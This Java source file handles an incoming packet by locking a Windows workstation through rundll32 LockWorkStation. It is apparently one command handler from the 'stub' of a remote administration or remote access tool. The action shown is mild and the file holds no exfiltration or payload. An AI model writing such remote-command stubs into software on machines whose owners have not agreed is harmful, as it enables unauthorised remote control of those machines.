package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.common.OperatingSystem;

public class Packet32LockComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("rundll32.exe user32.dll, LockWorkStation");
		}
	}

}
